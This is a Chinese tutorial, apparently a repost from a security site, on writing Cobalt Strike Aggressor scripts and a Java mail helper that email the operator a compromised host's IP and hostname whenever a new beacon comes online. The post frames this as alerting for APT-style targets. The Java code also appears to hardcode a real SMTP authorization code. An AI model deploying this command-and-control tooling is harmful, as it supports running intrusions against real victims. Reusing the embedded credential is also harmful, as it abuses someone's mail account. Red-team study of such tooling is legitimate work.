> 原文链接: https://www.anquanke.com//post/id/98829 


# Cobalt  Strike神器高级教程利用Aggressor脚本编写目标上线邮件提醒


                                阅读量   
                                **390496**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">5</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t010728f2e7cf71c765.png)](https://p1.ssl.qhimg.com/t010728f2e7cf71c765.png)



## 前言

很久以前就想写这篇文章了，今天发这篇文章主要想多结识下喜欢开发的大佬们。个人认为Cobalt Strike强大不止在于后渗透跟权限维持上，还有强大的可扩展性，打造出一款强大的渗透神器如：添加上线自动化持久性权限控制，APT攻击目标上线提醒，AV识别等等一系列功能，这边先编写一个上线邮件提醒功能，还有很多十分强大引用下Github的项目大家一看便知。

[https://github.com/bluscreenofjeff/AggressorScripts](https://github.com/bluscreenofjeff/AggressorScripts)

[https://github.com/harleyQu1nn/AggressorScripts](https://github.com/harleyQu1nn/AggressorScripts)

开源的项目有很多跟自己需求不符所以自己学习了一下[Aggressor](https://www.cobaltstrike.com/aggressor-script)<br>
脚本基础，首先Aggressor脚本基于Sleep脚本编写的所以在学习Aggressor脚本之前需要先学习[Sleep](http://sleep.dashnine.org/manual)语言。我们直接进入正题介绍下Aggressor脚本，大多数Cobalt Strike对话框和功能都是作为独立模块编写的，这些模块向Aggressor Script引擎提供了一些接口如[default.cna](https://www.cobaltstrike.com/aggressor-script/default.cna)定义了默认的Cobalt Strike的工具栏按钮，弹出式菜单，除此之外可以利用提供的API来模拟红队成员与你并肩作战以及扩展跟修改Cobalt Strike的现有功能等。



## 目标：上线邮件提醒

基础知识大家看[文档学习](https://www.cobaltstrike.com/aggressor-script)这里就不啰嗦了直接进入正题，编写上线邮件提醒脚本发送邮件的部分我们采用java编写，因为java可以跨平台使用所以我们可以在windows，mac，linux，首先我们需要先了解如何在Aggressor中如何加载java类并且实例化java对象。

```
#导入jar包
import package from: path-to/filename.jar;

#实例化对象并传入参数相当于java中 Point point = new Point(3,4);   
$point = [new Point: 3, 4];
println($point);

java.awt.Point[x=3,y=4]

#导入包也可以用import java.awt.*;
```

了解到如何加载java类后通过调用`beacon_initial`方法在新目标上线时执行相应的方法。

```
on beacon_initial `{`

# 做一些东西
`}`
```

通过以上知识编写好java类打包成Jar（源代码在下方会提供）提供一个带参数的方法在Aggressor脚本中的beacon_initial方法进行加载从而发送邮件。



## 这里把版本分为了命令行版与GUI版本如下：

### 命令行版代码

```
import email.content.Main from: cna_mail.jar;
on beacon_initial `{`
# 循环获取所有beacon
#xxxxxxx@163.com 代表接收发送邮箱
#account 代表接收邮箱列表
foreach $entry (beacons()) `{`

               if($entry['id'] == $1)`{`
@account = @("xxx@163.com","xxx@163.com");

$value = [new Main];
[$value setValue : "xxxxxxx@163.com","password","smtp.163.com",@account,$entry['computer'],"fajianren",,"Target ip:" . $entry['internal'] . " Target host: " . $entry['computer']];
[$value  start];

    `}`
  `}`
`}`
```

命令行版主要作用是在服务器上进行运行运行完成后无需在操作上线即可接收到邮箱内容为`Target ip:xxxx Target host:xxxx`，加载方法如下：

```
./agscript [host] [port] [user] [password] [/path/to/script.cna]
```

[![](https://p0.ssl.qhimg.com/t0158406cb53e805803.png)](https://p0.ssl.qhimg.com/t0158406cb53e805803.png)

在GUI客户端可以查看到ad用户以上线

[![](https://p1.ssl.qhimg.com/t01d41b62585bf6b909.png)](https://p1.ssl.qhimg.com/t01d41b62585bf6b909.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](Documents%20and%20SettingsAdministrator%E6%A1%8C%E9%9D%A2ad.png)**GUI版本代码**

```
import email.content.Main from: cna_mail.jar;
local('$smtp $myEmailAccount $myEmailPassword $Sender @Recipients');

sub stage_attack`{`

 %options = $3;
$smtp = %options['smtp'];
$myEmailAccount = %options['myEmailAccount'];
$myEmailPassword = %options['myEmailPassword'];
$Sender = %options['Sender'];
 #输入的内容是以,隔开的所以这里有,进行分割
@Recipients = split(',',%options['Recipients']);
 `}`


on beacon_initial `{`

    show_message($myEmailPassword);

foreach $entry (beacons()) `{`

               if($entry['id'] == $1)`{`
$value = [new Main];
[$value setValue : $myEmailAccount,$myEmailPassword,$smtp,@Recipients,$entry['computer'] ,$Sender,"Target ip:" . $entry['internal'] . " Target host: " . $entry['computer']];
[$value  start];
println(@Recipients);
  `}`
   `}`
`}`

popup attacks `{`
local('$dialog %defaults');
  item "set email"`{`
# setup our defaults
%defaults["smtp"] = "smtp.163.com";
%defaults["myEmailAccount"]  = "xxx@163.com";
%defaults["myEmailPassword"] = "*******";
%defaults["Sender"] = "Sender";
%defaults["Recipients"] = "xxx@gmail.com";
$dialog = dialog("email online reminder", %defaults, &amp;stage_attack);
dialog_description($dialog, "This is a cobalt strike on-line automatically remind the plug-in if there are multiple recipients please use, separated.");
drow_text($dialog, "smtp", "smtp: ");
drow_text($dialog, "myEmailAccount", "Outbox: ");
drow_text($dialog, "myEmailPassword", "Password: ");
drow_text($dialog, "Sender", "Sender: ");
drow_text($dialog, "Recipients", "Recipients: ");
dbutton_action($dialog, "Launch");

        # show our dialog
        dialog_show($dialog);
  `}`
`}`
```

<strong>GUI版本加载方法*<br>
通过点击</strong>Cobalt Strike – &gt; Script Manager**并按**Load**在图形化中脚本。<br>[![](https://www.cobaltstrike.com/aggressor-script/images/scriptloader.jpg)](https://www.cobaltstrike.com/aggressor-script/images/scriptloader.jpg)

GUI版本主要就是为了方便在GUI界面中使用，使用dialog的方式进行呈现方便用户使用，在attacks下载框中添加`set email`选项点击调用一个dialog输入框输入完成点击`Launch` 即可。

[![](https://p5.ssl.qhimg.com/t01fa22db7aba0f7100.png)](https://p5.ssl.qhimg.com/t01fa22db7aba0f7100.png)

**cna_mail.jar**

使用java编写aggressor脚本提供Main类中的setValue进行参数传递，start方法进行邮件发送。

```
package email.content;

import javax.mail.Address;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.Date;
import java.util.Properties;

/**
 * JavaMail 版本: 1.6.0
 * JDK 版本: JDK 1.7 以上（必须）
 */
public class Main `{`

// 发件人的 邮箱 和 密码（替换为自己的邮箱和密码）
// PS: 某些邮箱服务器为了增加邮箱本身密码的安全性，给 SMTP 客户端设置了独立密码（有的邮箱称为“授权码”）,
// 对于开启了独立密码的邮箱, 这里的邮箱密码必需使用这个独立密码（授权码）。
public  String myEmailAccount = "XXXXXX@163.com";
public String myEmailPassword = "qyeycemagybdijgc";
public  String personal= "";
public  String subject= "";

 public  String value="";
// 发件人邮箱的 SMTP 服务器地址, 必须准确, 不同邮件服务器地址不同, 一般(只是一般, 绝非绝对)格式为: smtp.xxx.com
// 网易163邮箱的 SMTP 服务器地址为: smtp.163.com
public  String myEmailSMTPHost = "smtp.163.com";

// 收件人邮箱（替换为自己知道的有效邮箱）
public static String[] receiveMailAccount=`{`"XXXXXXX@163.com"`}`;
public  void setValue(String myEmailAccount,String myEmailPassword,String myEmailSMTPHost,String[] receiveMailAccount,String subject,String personal,String value)`{`
this.myEmailAccount = myEmailAccount;
this.myEmailPassword = myEmailPassword;
this.myEmailSMTPHost = myEmailSMTPHost;
this.receiveMailAccount = receiveMailAccount;
this.personal=personal;
this.value=value;
this.subject=subject;


`}`
public void start()`{`
Properties props = new Properties();// 参数配置
props.setProperty("mail.transport.protocol", "smtp");   // 使用的协议（JavaMail规范要求）
props.setProperty("mail.smtp.host", myEmailSMTPHost);   // 发件人的邮箱的 SMTP 服务器地址
props.setProperty("mail.smtp.auth", "true");// 需要请求认证

// PS: 某些邮箱服务器要求 SMTP 连接需要使用 SSL 安全认证 (为了提高安全性, 邮箱支持SSL连接, 也可以自己开启),
// 如果无法连接邮件服务器, 仔细查看控制台打印的 log, 如果有有类似 “连接失败, 要求 SSL 安全连接” 等错误,
// 打开下面 /* ... */ 之间的注释代码, 开启 SSL 安全连接。
/*
// SMTP 服务器的端口 (非 SSL 连接的端口一般默认为 25, 可以不添加, 如果开启了 SSL 连接,
//  需要改为对应邮箱的 SMTP 服务器的端口, 具体可查看对应邮箱服务的帮助,
//  QQ邮箱的SMTP(SLL)端口为465或587, 其他邮箱自行去查看)
final String smtpPort = "465";
props.setProperty("mail.smtp.port", smtpPort);
props.setProperty("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
props.setProperty("mail.smtp.socketFactory.fallback", "false");
props.setProperty("mail.smtp.socketFactory.port", smtpPort);
*/

final String smtpPort = "465";
props.setProperty("mail.smtp.port", smtpPort);
props.setProperty("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
props.setProperty("mail.smtp.socketFactory.fallback", "false");
props.setProperty("mail.smtp.socketFactory.port", smtpPort);
// 2. 根据配置创建会话对象, 用于和邮件服务器交互
Session session = Session.getInstance(props);
session.setDebug(true); // 设置为debug模式, 可以查看详细的发送 log

// 3. 创建一封邮件
MimeMessage message = null;
try `{`
message = createMimeMessage(session, myEmailAccount, receiveMailAccount);


// 4. 根据 Session 获取邮件传输对象
Transport transport = session.getTransport();

// 5. 使用 邮箱账号 和 密码 连接邮件服务器, 这里认证的邮箱必须与 message 中的发件人邮箱一致, 否则报错
//
//PS_01: 成败的判断关键在此一句, 如果连接服务器失败, 都会在控制台输出相应失败原因的 log,
//   仔细查看失败原因, 有些邮箱服务器会返回错误码或查看错误类型的链接, 根据给出的错误
//   类型到对应邮件服务器的帮助网站上查看具体失败原因。
//
//PS_02: 连接失败的原因通常为以下几点, 仔细检查代码:
//   (1) 邮箱没有开启 SMTP 服务;
//   (2) 邮箱密码错误, 例如某些邮箱开启了独立密码;
//   (3) 邮箱服务器要求必须要使用 SSL 安全连接;
//   (4) 请求过于频繁或其他原因, 被邮件服务器拒绝服务;
//   (5) 如果以上几点都确定无误, 到邮件服务器网站查找帮助。
//
//PS_03: 仔细看log, 认真看log, 看懂log, 错误原因都在log已说明。
transport.connect(myEmailAccount, myEmailPassword);

// 6. 发送邮件, 发到所有的收件地址, message.getAllRecipients() 获取到的是在创建邮件对象时添加的所有收件人, 抄送人, 密送人
transport.sendMessage(message, message.getAllRecipients());

// 7. 关闭连接
transport.close();
`}` catch (Exception e) `{`
e.printStackTrace();
`}`
`}`

/**
 * 创建一封只包含文本的简单邮件
 *
 * @param session 和服务器交互的会话
 * @param sendMail 发件人邮箱
 * @param receiveMail 收件人邮箱
 * @return
 * @throws Exception
 */
public  MimeMessage createMimeMessage(Session session, String sendMail, String[] receiveMail) throws Exception `{`
// 1. 创建一封邮件
MimeMessage message = new MimeMessage(session);

// 2. From: 发件人（昵称有广告嫌疑，避免被邮件服务器误认为是滥发广告以至返回失败，请修改昵称）
message.setFrom(new InternetAddress(sendMail, personal, "UTF-8"));
Address a = null;
// 3. To: 收件人（可以增加多个收件人、抄送、密送）
//for (String email:receiveMail) `{`
// a = new InternetAddress(email, personal1, "UTF-8");
//`}`
InternetAddress[] address = new InternetAddress[receiveMail.length];
for (int i = 0; i &lt; receiveMail.length; i++) `{`

address[i] = new InternetAddress(receiveMail[i]);
`}`
message.setRecipients(MimeMessage.RecipientType.TO, address);

// 4. Subject: 邮件主题（标题有广告嫌疑，避免被邮件服务器误认为是滥发广告以至返回失败，请修改标题）
message.setSubject(subject, "UTF-8");

// 5. Content: 邮件正文（可以使用html标签）（内容有广告嫌疑，避免被邮件服务器误认为是滥发广告以至返回失败，请修改发送内容）
message.setContent(value, "text/html;charset=UTF-8");

// 6. 设置发件时间
message.setSentDate(new Date());

// 7. 保存设置
message.saveChanges();

return message;
`}`

`}`
```

编译好cna_mail.jar跟Aggressor脚本放入Cobalt Scrike目录即可使用。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](UserssuperdongDesktopa1.png)

由于第一次写文章有很多地方还有些不足，希望能多认识各位大佬和大佬们多多交流。

附github地址 [https://github.com/SuperDong0/Aggressor_mail](https://github.com/SuperDong0/Aggressor_mail)
